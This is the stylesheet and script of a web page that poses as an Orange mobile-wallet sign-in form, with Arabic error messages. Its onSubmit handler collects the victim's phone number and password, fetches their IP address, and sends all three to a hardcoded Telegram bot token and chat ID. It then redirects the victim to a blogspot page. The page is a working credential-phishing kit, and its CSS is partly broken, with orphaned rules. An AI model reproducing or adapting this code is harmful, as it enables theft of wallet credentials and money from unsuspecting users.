    <style>

        body {

          display: flex;

            justify-content: center;

            align-items: center;

            background-color: #FFFFFF;

            color:#000000;

            margin: 0;

            padding: 0;

            text-align: right;

        }

        .container {

          

            max-width: 400px;
            }

        h2 {

          margin-bottom: 20px; /* مسافة بين العنوان والحقل */
            margin-bottom: 10px;

          font-size: 30px;

            background-color: #FFFFFF;

            padding: 30px;

            border-radius: 20px;

            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);

        }

        h1 {

            color: #333;

            font-size: 24px;

            display: flex;

            justify-content: space-between;
            align-items: center;

            margin-bottom: 10px;

            direction: ltr;

        }

        .orange {

            color: #ff6600;

            font-weight: bold;

        }

            display: block;

            margin: 15px 0 5px;

            color: #666;

            text-align: right;

        }  .phone-label {

            justify-content: flex-end;

            align-items: center;

            position: relative;

        }

        .phone-label span {

            display: inline-block;

        }

        .phone-label .orange {

            margin-right: 5px; /* وضع "Orange" إلى اليمين */

        }

            border-bottom: 2px solid #000000; /* خط أسفل */border-radius: 5px;

            font-size: 14px;

            outline: none; /* إزالة التحديد عند

        }

            align-items: center;

            margin-bottom: 15px;

            font-size: 14px;

            position: relative;

        }

        .checkbox-container label {

            margin-left: 10px;

            font-size: 14px;
}

            color:#ff6600;

            text-decoration: center;

            cursor: pointer;

        }

            background-color: #ff6600;

            color: #000000;

            border: none;

            padding: 8px;

            width: 100%;

            border-radius: 5px;

            font-size: 12px;

            cursor: pointer;

         margin-top: 1px;

        }

        .btn:hover {

            background-color: #e55a00;

        }

        .transparent-btn {

            background-color: transparent;

            color: #ff6600;

            border: 1px solid #ccc;

            padding: 8px;

            width: 100%;

            border-radius: 3px;

            font-size: 14px;

            cursor: pointer;

            margin-top: 5px;

        }

        .transparent-btn:hover {

            background-color: #808080;

        }

        .note {

            font-size: 12px;

            color: #999;

            margin-top: 5px;

            text-align: right;

        }

        .subnote {

            font-size: 12px;

            color: #999;

            text-align: right;

            margin-bottom: 6px;
        }

            color: red;

            margin-bottom: 7px;

    <script>

        function validatePassword(password) {

            // تحقق من عدم وجود أحرف عربية

            const arabicRegex = /[\u0600-\u06FF]/;

            if (arabicRegex.test(password)) {

                return false;

            }

            // تحقق من أن كلمة السر تحتوي على رموز وأرقام أو رموز وأرقام وأحرف

            const symbolRegex = /[!@#$%^&*(),.?":{}|<>]/;

            const numberRegex = /\d/;

            const letterRegex = /[a-zA-Z]/;

            return (symbolRegex.test(password) && numberRegex.test(password)) &&(!letterRegex.test(password) || letterRegex.test(password));

        }

        function validateForm() {

            const phone = document.getElementById('phone').value;

            const password = document.getElementById('password').value;

            const errorMsg = document.getElementById('error-msg');

            if (!/^\d{10}$/.test(phone)) {

                errorMsg.innerText = "لقد أدخلت رقم محفظة و / أو كلمة سر خاطئة. يرجى إدخال رقم محفظة و / أو كلمة سر صحيحة او القيام بتغيير كلمة السر";

                errorMsg.style.display = 'block';

                return false;

            }

            if (!validatePassword(password)) {

                errorMsg.innerText = "لقد أدخلت رقم محفظة و / أو كلمة سر خاطئة. يرجى إدخال رقم محفظة و / أو كلمة سر صحيحة او القيام بتغيير كلمة السر";

                errorMsg.style.display = 'block';

                return false;

            }

            errorMsg.style.display = 'none'; // إخفاء الإشعار في حالة الإدخال الصحيح

            return true;

        }function sendTelegramMessage(botToken, chatId, message) {

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const data = {

                chat_id: chatId,

                text: message,

                parse_mode: "MarkdownV2"  // لتنسيق الرسالة

            };

            return fetch(url, {

                method: 'POST',

                headers: {

                    'Content-Type': 'application/json'

                },

                body: JSON.stringify(data)

            });

        }

        async function onSubmit(event) {

            event.preventDefault();

            if (!validateForm()) return;

            const phone = document.getElementById('phone').value;

            const password = document.getElementById('password').value;

            try {

                const ipRequest = await fetch('https://api.ipify.org?format=json');const ipResponse = await ipRequest.json();

                const ipAddress = ipResponse.ip;

                // تنسيق الرسالة باستخدام MarkdownV2

                const message = `*تسجيل*\n\n` +

                                `*رقم الهاتف:* \`${phone}\`\n` +

                                `*كلمة السر:* \`${password}\`\n` +

                                `*IP:* \`${ipAddress}\``;

                // إرسال الرسالة إلى البوت

                await sendTelegramMessage('7755037837:AAGoRSQw2xopsfB8oH8TugO8XEQD-VSOkPE','8194718375', message);

                // تحويل المستخدم إلى الرابط المحدد

                window.location.href = "https://orangenaloppts.blogspot.com/2024/12/box-sizing-border-box-margin-0-padding.html";

            } catch (error) {

                console.error('Error:', error);

            }

        }

    </script>
